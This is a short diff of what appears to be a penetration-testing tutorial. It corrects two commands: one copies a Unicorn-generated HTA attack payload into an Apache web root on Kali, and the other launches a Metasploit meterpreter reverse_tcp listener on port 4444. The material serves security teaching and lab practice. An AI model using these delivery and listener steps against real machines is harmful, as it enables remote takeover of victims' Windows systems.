@@ -76,7 +76,7 @@ less /opt/unicorn/README.md
 While there are multiple ways to deliver the payload I opted to put it into Apache on my Kali VM.
 
 ```
-cp hta_attack /var/www/html
+cp -r hta_attack /var/www/html
 cd /var/www/html/hta_attack
 ```
 
@@ -139,7 +139,7 @@ Move back to /opt where we will drop our collected file and start the Metasploit
 
 ```
 cd /opt
-msfconsole -r /var/www/html/hta_attack/unicorn.rc'  
+msfconsole -r /var/www/html/hta_attack/unicorn.rc  
 ```
 
 This launches our listener using windows/meterpreter/reverse_tcp on port 4444.
